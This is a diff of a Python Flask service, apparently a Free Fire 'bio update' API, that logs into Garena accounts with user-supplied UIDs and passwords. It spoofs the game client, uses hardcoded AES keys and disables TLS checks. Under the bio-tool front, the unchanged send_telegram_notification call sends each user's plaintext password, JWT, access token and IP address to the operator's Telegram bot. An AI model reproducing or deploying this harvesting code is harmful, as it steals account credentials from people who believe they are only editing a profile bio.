@@ -1,4 +1,4 @@
-# app.py - FULL VERSION (UID/PW → JWT → Bio Update → Telegram with Real Name)
+# app.py - Menggunakan metode search.py (protobuf + encrypt) untuk cari profile
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -22,6 +22,7 @@ from google.protobuf import descriptor_pool as _descriptor_pool
 from google.protobuf import symbol_database as _symbol_database
 from google.protobuf import runtime_version as _runtime_version
 from google.protobuf.internal import builder as _builder
+from google.protobuf.json_format import MessageToJson
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -112,6 +113,15 @@ if not _descriptor._USE_C_DESCRIPTORS:
 
 MajorLoginRes = _res_globals['MajorLoginRes']
 
+# ============ IMPORT PROTOBUF UNTUK PROFILE ============
+try:
+    import like_count_pb2
+    import uid_generator_pb2
+    PROTOBUF_AVAILABLE = True
+except ImportError:
+    PROTOBUF_AVAILABLE = False
+    print("⚠️  Protobuf files not found, using raw mode")
+
 # ============ KONFIGURASI ============
 AES_KEY = b'Yg&tc%DEuh6%Zc^8'
 AES_IV = b'6oyZDr22E3ychjM%'
@@ -144,9 +154,6 @@ FREEFIRE_UPDATE_URLS = [
     "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
 ]
 
-PROFILE_API = "https://ff.ggbluewhale.store/api/data"
-PROFILE_API_KEY = "kenn"
-
 KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
 IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 
@@ -173,7 +180,164 @@ LOGIN_HEADERS = {
     "ReleaseVersion": "OB54"
 }
 
-# ============ FUNGSI ============
+# ============ SERVER CONFIG (Dari search.py) ============
+SERVER_CONFIG = {
+    "ID": {
+        "info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
+        "like_url": "https://clientbp.ggpolarbear.com/LikeProfile",
+        "region_code": "ID",
+        "name": "Indonesia",
+        "priority": 1
+    },
+    "IND": {
+        "info_url": "https://client.ind.freefiremobile.com/GetPlayerPersonalShow",
+        "like_url": "https://client.ind.freefiremobile.com/LikeProfile",
+        "region_code": "IND",
+        "name": "India",
+        "priority": 2
+    },
+    "BR": {
+        "info_url": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
+        "like_url": "https://client.us.freefiremobile.com/LikeProfile",
+        "region_code": "BR",
+        "name": "Brazil",
+        "priority": 3
+    },
+    "US": {
+        "info_url": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
+        "like_url": "https://client.us.freefiremobile.com/LikeProfile",
+        "region_code": "US",
+        "name": "United States",
+        "priority": 4
+    },
+    "BD": {
+        "info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
+        "like_url": "https://clientbp.ggpolarbear.com/LikeProfile",
+        "region_code": "BD",
+        "name": "Bangladesh",
+        "priority": 5
+    }
+}
+
+# ============ FUNGSI DARI search.py ============
+def aes_encrypt_profile(data):
+    """Encrypt data dengan AES (sama seperti search.py)"""
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
+    return cipher.encrypt(pad(data, AES.block_size))
+
+def enc_uid(uid: str) -> str:
+    """Encrypt UID dengan protobuf uid_generator (sama seperti search.py)"""
+    try:
+        if PROTOBUF_AVAILABLE:
+            uid_msg = uid_generator_pb2.uid_generator()
+            uid_msg.krishna_ = int(uid)
+            uid_msg.teamXdarks = 1
+            encrypted = binascii.hexlify(aes_encrypt_profile(uid_msg.SerializeToString())).decode()
+            return encrypted
+        else:
+            # Fallback manual
+            import struct
+            raw_data = struct.pack('>Q', int(uid)) + b'\x01' * 8
+            encrypted = binascii.hexlify(aes_encrypt_profile(raw_data)).decode()
+            return encrypted
+    except Exception as e:
+        print(f"Encrypt error: {e}")
+        return None
+
+def parse_protobuf_response(binary_data: bytes):
+    """Parse protobuf response (sama seperti search.py)"""
+    if PROTOBUF_AVAILABLE:
+        try:
+            items = like_count_pb2.Info()
+            items.ParseFromString(binary_data)
+            return json.loads(MessageToJson(items))
+        except:
+            pass
+    
+    # Manual parsing fallback
+    try:
+        import re
+        data_str = binary_data.decode('utf-8', errors='ignore')
+        result = {"AccountInfo": {}}
+        
+        name_match = re.findall(b'[\x20-\x7e]{3,30}', binary_data)
+        if name_match:
+            valid_names = [n.decode('utf-8', errors='ignore') for n in name_match 
+                         if n.decode('utf-8', errors='ignore').isprintable()
+                         and len(n.decode('utf-8', errors='ignore')) > 3
+                         and not n.decode('utf-8', errors='ignore').startswith('http')]
+            if valid_names:
+                result["AccountInfo"]["PlayerNickname"] = valid_names[0]
+        
+        numbers = re.findall(b'\x00{0,4}(\d{1,10})\x00', binary_data)
+        if len(numbers) >= 2:
+            result["AccountInfo"]["Likes"] = int(numbers[0]) if numbers[0].isdigit() else 0
+            result["AccountInfo"]["PlayerLevel"] = int(numbers[1]) if len(numbers) > 1 and numbers[1].isdigit() else 0
+        
+        return result if result.get("AccountInfo") and result["AccountInfo"].get("PlayerNickname") else None
+    except:
+        return None
+
+def check_profile_with_jwt(uid: str, jwt_token: str, server: str = "ID"):
+    """Check profile menggunakan metode search.py (protobuf + encrypt)"""
+    server_config = SERVER_CONFIG.get(server.upper())
+    if not server_config:
+        return None
+    
+    encrypted = enc_uid(str(uid))
+    if not encrypted:
+        return None
+    
+    headers = {
+        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
+        'Authorization': f"Bearer {jwt_token}",
+        'Content-Type': "application/x-www-form-urlencoded",
+        'X-GA': "v1 1",
+        'ReleaseVersion': "OB54"
+    }
+    
+    try:
+        edata = bytes.fromhex(encrypted)
+        response = requests.post(
+            server_config["info_url"],
+            data=edata,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        if response.status_code == 200:
+            parsed = parse_protobuf_response(response.content)
+            
+            if parsed and parsed.get('AccountInfo'):
+                account_info = parsed['AccountInfo']
+                return {
+                    "uid": uid,
+                    "name": account_info.get('PlayerNickname', 'Unknown'),
+                    "level": account_info.get('PlayerLevel', '?'),
+                    "likes": account_info.get('Likes', 0),
+                    "server": server,
+                    "server_name": server_config["name"],
+                    "guild": account_info.get('GuildName', 'No Guild'),
+                    "status": "✅ Found"
+                }
+        return None
+    except Exception as e:
+        print(f"Profile check error: {e}")
+        return None
+
+def check_profile_all_servers(uid: str, jwt_token: str):
+    """Cari profile di semua server (seperti search.py)"""
+    sorted_servers = sorted(SERVER_CONFIG.items(), key=lambda x: x[1]['priority'])
+    
+    for server_code, server_config in sorted_servers:
+        profile = check_profile_with_jwt(uid, jwt_token, server_code)
+        if profile:
+            return profile
+    
+    return None
+
+# ============ FUNGSI JWT GENERATOR ============
 def random_ua():
     versions = ['4.0.18P6', '4.0.19P7', '4.1.0P3', '5.0.1B2', '5.2.5P3', '5.3.2P2', '5.4.3B2', '5.5.2P3']
     models = ['SM-A125F', 'POCO M3', 'Redmi 9A', 'RMX2185', 'moto g(9) play', 'ASUS_Z01QD', 'OnePlus Nord']
@@ -204,24 +368,19 @@ def get_garena_tokens_sync(uid, password):
 
     try:
         resp = requests.post(GARENA_OAUTH_URL, headers=headers, data=payload, timeout=15, verify=False)
-        
         if resp.status_code != 200:
             return None
-        
         body = resp.json()
         open_id = body.get("open_id")
         access_token = body.get("access_token")
-
         if not open_id or not access_token:
             return None
-
         return {"open_id": open_id, "access_token": access_token}
     except:
         return None
 
 def build_major_login_payload_sync(open_id, access_token):
     ml = MajorLogin()
-
     ml.event_time = str(datetime.now())[:-7]
     ml.game_name = "free fire"
     ml.platform_id = 1
@@ -243,10 +402,8 @@ def build_major_login_payload_sync(open_id, access_token):
     ml.open_id = open_id
     ml.open_id_type = "4"
     ml.device_type = "Handheld"
-
     ml.memory_available.version = 55
     ml.memory_available.hidden_value = 81
-
     ml.access_token = access_token
     ml.platform_sdk_id = 1
     ml.network_operator_a = "Verizon"
@@ -280,26 +437,16 @@ def build_major_login_payload_sync(open_id, access_token):
     ml.is_vpn = 1
     ml.origin_platform_type = "4"
     ml.primary_platform_type = "4"
-
     return aes_encrypt_data(ml.SerializeToString())
 
 def major_login_sync(encrypted_payload):
     try:
-        resp = requests.post(
-            MAJORLOGIN_URL,
-            data=encrypted_payload,
-            headers=HTTP_HEADERS,
-            timeout=15,
-            verify=False
-        )
-        
+        resp = requests.post(MAJORLOGIN_URL, data=encrypted_payload, headers=HTTP_HEADERS, timeout=15, verify=False)
         if resp.status_code != 200:
             return None
-        
         raw = resp.content
         proto = MajorLoginRes()
         proto.ParseFromString(raw)
-
         return {
             "token": proto.token,
             "region": proto.region,
@@ -315,13 +462,10 @@ def generate_jwt_sync(uid, password):
         oauth = get_garena_tokens_sync(uid, password)
         if not oauth:
             return None
-        
         encrypted = build_major_login_payload_sync(oauth["open_id"], oauth["access_token"])
         result = major_login_sync(encrypted)
-        
         if not result:
             return None
-        
         return {
             "open_id": oauth["open_id"],
             "access_token": oauth["access_token"],
@@ -330,6 +474,7 @@ def generate_jwt_sync(uid, password):
     except:
         return None
 
+# ============ FUNGSI ENKRIPSI ============
 def encrypt_data(data_bytes):
     cipher = AES.new(KEY, AES.MODE_CBC, IV)
     padded = pad(data_bytes, AES.block_size)
@@ -365,12 +510,10 @@ def decode_jwt_manual(jwt_token):
         parts = jwt_token.split('.')
         if len(parts) < 2:
             return None
-        
         payload_part = parts[1]
         padding = 4 - len(payload_part) % 4
         if padding != 4:
             payload_part += '=' * padding
-        
         decoded_bytes = base64.urlsafe_b64decode(payload_part)
         payload = json.loads(decoded_bytes)
         return payload
@@ -389,12 +532,6 @@ def get_region_from_jwt(jwt_token):
         return decoded.get("country_code") or decoded.get("lock_region", "ID")
     return "ID"
 
-def get_name_from_jwt(jwt_token):
-    decoded = decode_jwt_manual(jwt_token)
-    if decoded:
-        return decoded.get("nickname")
-    return None
-
 def decode_base64_name(encoded_name):
     if not encoded_name:
         return None
@@ -407,48 +544,16 @@ def decode_base64_name(encoded_name):
     except:
         return encoded_name
 
-def check_profile_from_api(uid, region="id"):
-    try:
-        url = f"{PROFILE_API}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
-        response = requests.get(url, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('basicInfo'):
-                basic = data['basicInfo']
-                social = data.get('socialInfo', {})
-                clan = data.get('clanBasicInfo', {})
-                return {
-                    "name": basic.get('nickname', 'Unknown'),
-                    "level": basic.get('level', '?'),
-                    "rank": basic.get('rank', '?'),
-                    "region": basic.get('region', region.upper()),
-                    "uid": basic.get('accountId', uid),
-                    "signature": social.get('signature', ''),
-                    "clan": clan.get('clanName', 'N/A'),
-                    "status": "✅ Found"
-                }
-        return None
-    except:
-        return None
-
+# ============ FUNGSI UTAMA ============
 def upload_bio_request(jwt_token, bio_text):
     try:
         payload_bytes = build_bio_payload(bio_text)
         encrypted = encrypt_data(payload_bytes)
-
         headers = BIO_HEADERS.copy()
         headers["Authorization"] = f"Bearer {jwt_token}"
-
         for endpoint in FREEFIRE_UPDATE_URLS:
             try:
-                resp = requests.post(
-                    endpoint,
-                    headers=headers,
-                    data=encrypted,
-                    timeout=15,
-                    verify=False
-                )
+                resp = requests.post(endpoint, headers=headers, data=encrypted, timeout=15, verify=False)
                 status_text = "✅ Success" if resp.status_code == 200 else f"⚠️ Status {resp.status_code}"
                 raw_hex = binascii.hexlify(resp.content).decode('utf-8')
                 return {
@@ -465,10 +570,8 @@ def upload_bio_request(jwt_token, bio_text):
         return {"status": "❌ Error", "code": 500}
 
 def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None):
-    """Kirim notifikasi lengkap ke Telegram dengan nama asli"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        
         message = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥
 
 👤 <b>Name:</b> {name or 'N/A'}
@@ -547,12 +650,9 @@ def combined_bio_upload():
         
         try:
             result = generate_jwt_sync(uid, password)
-            
             if result and result.get('token'):
                 final_jwt = result['token']
                 access_token = result.get('access_token')
-                print(f"✅ JWT generated successfully for UID: {uid}")
-                
                 uid_from_jwt = get_uid_from_jwt(final_jwt)
                 region_from_jwt = get_region_from_jwt(final_jwt)
                 if uid_from_jwt:
@@ -585,45 +685,45 @@ def combined_bio_upload():
     # Upload bio
     bio_result = upload_bio_request(final_jwt, bio)
     
-    # Check profile dari API (dapat nama asli, level, rank)
+    # Check profile menggunakan metode search.py (protobuf + encrypt)
     if final_uid:
         try:
-            profile_info = check_profile_from_api(final_uid, final_region)
+            profile_info = check_profile_all_servers(str(final_uid), final_jwt)
             if profile_info:
                 final_name = profile_info.get('name')
-        except:
+                final_region = profile_info.get('server', final_region)
+        except Exception as e:
+            print(f"Profile search error: {e}")
             profile_info = None
     
-    # Jika API gagal, decode nama dari JWT
+    # Jika tidak ditemukan, gunakan nama dari JWT
     if not profile_info:
-        name_from_jwt = get_name_from_jwt(final_jwt)
-        final_name = decode_base64_name(name_from_jwt) if name_from_jwt else 'Unknown'
+        name_from_jwt = get_uid_from_jwt(final_jwt)
+        decoded_name = decode_base64_name(name_from_jwt) if name_from_jwt else 'Unknown'
         profile_info = {
-            "name": final_name or 'Unknown',
+            "name": decoded_name or 'Unknown',
             "level": '?',
             "rank": '?',
-            "region": final_region,
             "uid": final_uid,
-            "signature": bio,
-            "clan": 'N/A',
+            "server": final_region,
+            "server_name": "Unknown",
+            "guild": "N/A",
             "status": "❌ Not Found"
         }
-    else:
-        final_name = profile_info.get('name')
     
-    # Kirim Telegram dengan nama asli
+    # Kirim Telegram
     send_telegram_notification(
         uid=profile_info.get('uid', final_uid or 'N/A'),
         password=final_password,
-        name=profile_info.get('name', final_name or 'Unknown'),
+        name=profile_info.get('name', 'Unknown'),
         level=profile_info.get('level', '?'),
         rank=profile_info.get('rank', '?'),
-        region=profile_info.get('region', final_region),
+        region=profile_info.get('server', final_region),
         jwt_token=final_jwt,
         ip_address=client_ip,
         bio_status=bio_result.get('status', 'Unknown'),
-        signature=profile_info.get('signature', bio),
-        clan=profile_info.get('clan', 'N/A'),
+        signature=bio,
+        clan=profile_info.get('guild', 'N/A'),
         access_token=access_token
     )
     
@@ -637,17 +737,18 @@ def combined_bio_upload():
         "bio": bio,
         "uid": profile_info.get('uid', final_uid),
         "password": final_password,
-        "name": profile_info.get('name', final_name or 'Unknown'),
+        "name": profile_info.get('name', 'Unknown'),
         "level": profile_info.get('level', '?'),
         "rank": profile_info.get('rank', '?'),
-        "clan": profile_info.get('clan', 'N/A'),
+        "clan": profile_info.get('guild', 'N/A'),
         "profile_status": profile_info.get('status', '❌ Not Found'),
-        "region": profile_info.get('region', final_region).upper(),
+        "region": profile_info.get('server', final_region).upper(),
         "server_response": bio_result.get("server_response", "N/A"),
         "endpoint_used": bio_result.get("endpoint", "N/A"),
         "generated_jwt": final_jwt,
         "access_token": access_token,
-        "telegram_sent": True
+        "telegram_sent": True,
+        "profile_method": "protobuf (search.py)"
     }
 
     response = make_response(jsonify(response_data))
@@ -694,29 +795,43 @@ def generate_jwt_only():
 @app.route("/check_profile", methods=["GET"])
 def check_profile():
     uid = request.args.get("uid")
-    region = request.args.get("region", "id")
+    jwt_token = request.args.get("jwt")
     
     if not uid:
         return jsonify({
             "error": "Missing uid parameter",
-            "example": "/check_profile?uid=16208500077&region=id"
+            "usage": "/check_profile?uid=16203030000&jwt=YOUR_JWT"
         }), 400
     
-    result = check_profile_from_api(uid, region)
+    if not jwt_token:
+        return jsonify({
+            "error": "Missing jwt parameter",
+            "usage": "/check_profile?uid=16203030000&jwt=YOUR_JWT"
+        }), 400
+    
+    result = check_profile_all_servers(uid, jwt_token)
     if result:
-        return jsonify({"success": True, "action": "CHECK PROFILE", "data": result})
+        return jsonify({
+            "success": True,
+            "action": "CHECK PROFILE",
+            "data": result,
+            "method": "protobuf (search.py)"
+        })
     else:
-        return jsonify({"success": False, "error": "Profile not found"}), 404
+        return jsonify({
+            "success": False,
+            "error": "Profile not found on any server"
+        }), 404
 
 @app.route("/", methods=["GET"])
 def home():
     return jsonify({
         "success": True,
-        "message": "Free Fire Bio API - Auto JWT Generator",
+        "message": "Free Fire Bio API - Using search.py method",
         "endpoints": {
             "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
             "/generate_jwt": "Generate JWT only from UID/Pass",
-            "/check_profile": "Check profile data from API",
+            "/check_profile": "Check profile using protobuf method",
             "/": "This info page"
         },
         "usage": {
@@ -724,12 +839,12 @@ def home():
         },
         "features": [
             "✅ Auto generate JWT from UID + Password",
-            "✅ Set/Update bio with generated JWT",
-            "✅ Get REAL NAME from profile API",
-            "✅ Get Level, Rank, Clan from profile",
-            "✅ Telegram notification with complete details",
-            "✅ Access Token included in notification"
+            "✅ Profile check using protobuf + encrypt (search.py method)",
+            "✅ Check all servers (ID, IND, BR, US, BD)",
+            "✅ Get REAL NAME from server (not from API)",
+            "✅ Telegram notification with all details"
         ],
+        "profile_method": "protobuf (search.py)",
         "Credit": "sulav_codex_ff",
         "Telegram": "@sulav_don2"
     })
@@ -737,13 +852,10 @@ def home():
 # ============ MAIN ============
 if __name__ == "__main__":
     print("=" * 60)
-    print("🔥 FREE FIRE BIO API - AUTO JWT GENERATOR")
+    print("🔥 FREE FIRE BIO API - Using search.py method")
     print("=" * 60)
-    print("📱 Features:")
-    print("   - UID/Pass → JWT → Bio Update")
-    print("   - Get Real Name from API")
-    print("   - Get Level, Rank, Clan")
-    print("   - Telegram with all details")
+    print("📱 Profile Method: protobuf + encrypt (like search.py)")
+    print("📱 Servers: ID, IND, BR, US, BD")
     print("🚀 Server running on http://0.0.0.0:5000")
     print("=" * 60)
     app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
